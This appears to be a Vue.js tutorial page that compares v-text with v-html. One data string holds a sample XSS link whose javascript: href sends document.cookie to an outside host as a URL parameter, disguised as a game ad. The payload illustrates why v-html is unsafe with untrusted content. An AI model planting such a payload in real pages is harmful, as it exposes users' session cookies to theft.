<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>

<body>
    <div id="app">
        <div>你好，{{name}}</div>
        <div v-text="str"></div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#app',
            data: {
                name: 'xingye',
                str: '<h1>每一位追梦者</h1>',
                str2: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>是兄弟就来砍我</a>'
            }
        })
    </script>
</body>

</html>
